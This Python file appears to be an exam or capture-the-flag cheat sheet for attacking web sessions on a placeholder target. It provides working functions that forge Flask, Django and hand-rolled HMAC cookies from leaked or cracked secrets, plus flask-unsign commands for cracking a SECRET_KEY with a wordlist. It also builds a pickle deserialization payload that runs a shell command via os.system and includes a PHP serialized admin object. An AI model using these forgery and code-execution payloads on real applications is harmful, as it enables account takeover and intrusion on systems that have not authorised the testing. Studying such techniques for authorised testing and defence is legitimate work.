#!/usr/bin/env python3
"""Cookies and sessions: read, sign and forge.

Covers Flask signed sessions (itsdangerous), Django signed cookies, generic
HMAC-signed cookies, serialized payloads (PHP / Python pickle), and basic
cookie handling with requests.

Dependencies:
    pip install requests itsdangerous flask
    # Django only if you need its real signing: pip install django
"""

import base64
import hashlib
import hmac
import json
import pickle
import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"


def set_custom_cookie_example():
    """Send an arbitrary cookie without going through the normal login flow."""
    cookies = {"session": "value_to_test"}
    r = requests.get(f"{BASE_URL}/dashboard", cookies=cookies, verify=False, timeout=10)
    print(r.status_code, r.text[:200])
    return r


def read_session_cookies(session: requests.Session):
    """Dump the session's current cookies (to copy/paste or re-sign)."""
    for cookie in session.cookies:
        print(f"{cookie.name} = {cookie.value}  (domain={cookie.domain}, path={cookie.path})")


def flask_decode_session_cookie(cookie_value: str) -> bytes:
    """Read a Flask session cookie payload without the secret.

    Flask session cookies are base64url (optionally zlib-compressed) and signed
    with HMAC, but only the signature is protected: the payload is readable.
    Useful to see what is inside before trying to forge a new one. Format is
    payload.timestamp.signature."""
    import zlib

    payload_b64 = cookie_value.split(".")[0]

    def b64url_decode(s: str) -> bytes:
        padding = "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s + padding)

    raw = b64url_decode(payload_b64)
    try:
        raw = zlib.decompress(raw)
    except zlib.error:
        pass  # not compressed

    print("Decoded payload:", raw[:500])
    return raw


def flask_forge_session_cookie(secret_key: str, session_data: dict) -> str:
    """Forge any Flask session cookie given the app's SECRET_KEY (leaked repo,
    exposed .env, Werkzeug debug console, or cracked with flask-unsign).

    Requires the default Flask SecureCookieSessionInterface. Example data:
    {"user_id": 1, "is_admin": True}."""
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer

    serializer = URLSafeTimedSerializer(
        secret_key,
        salt="cookie-session",
        serializer=TaggedJSONSerializer(),
        signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1},
    )
    return serializer.dumps(session_data)


def flask_bruteforce_secret_hint():
    """Reference for cracking a Flask SECRET_KEY from a valid session cookie.
    Use flask-unsign rather than reimplementing it under exam time pressure:
        pip install flask-unsign
        flask-unsign --unsign --cookie "<cookie>" --wordlist rockyou.txt
        flask-unsign --sign --cookie "{'user_id': 1, 'is_admin': True}" --secret "<secret>"
    """
    pass


def django_forge_signed_cookie(secret_key: str, data: dict, salt: str = "") -> str:
    """Forge a Django signed cookie given SECRET_KEY from settings.py. Django
    uses django.core.signing.dumps (HMAC + base64), a different format from
    plain itsdangerous."""
    from django.conf import settings

    if not settings.configured:
        settings.configure(SECRET_KEY=secret_key)

    from django.core.signing import dumps
    return dumps(data, salt=salt)


def generic_hmac_sign(secret: bytes, message: str, digest: str = "sha256") -> str:
    """Reproduce a hand-rolled HMAC signature. Many custom apps build:
        cookie = base64(payload) + "." + hmac(secret, base64(payload))
    Once the secret is known (hardcoded, leaked, brute-forced) the signature
    can be reproduced exactly."""
    return hmac.new(secret, message.encode(), getattr(hashlib, digest)).hexdigest()


def generic_hmac_cookie_forge(secret: bytes, payload_dict: dict) -> str:
    """Build a base64(payload).hmac cookie from a payload dict."""
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b"=").decode()
    sig = generic_hmac_sign(secret, payload_b64)
    return f"{payload_b64}.{sig}"


def python_pickle_payload_example_readonly():
    """Show the shape of a pickle payload that runs a command if the app calls
    pickle.loads() on it. Illustrates the structure for recognition in traffic
    or code; it does not execute anything locally."""
    class Exploit:
        def __reduce__(self):
            import os
            return (os.system, ("id",))

    payload = pickle.dumps(Exploit())
    b64_payload = base64.b64encode(payload).decode()
    print("Pickle payload (base64) to send in the cookie/parameter:")
    print(b64_payload)
    return b64_payload


def php_serialized_object_example():
    """PHP serialized-object format, to recognize it in cookies/parameters.
    Marker: O:<class_name_len>:"Class":<n_props>:{...}. If the app calls
    unserialize() on user input, there is a PHP deserialization attack surface
    (POP chains, phar://)."""
    example = 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;}'
    print(example)
    return example


if __name__ == "__main__":
    pass
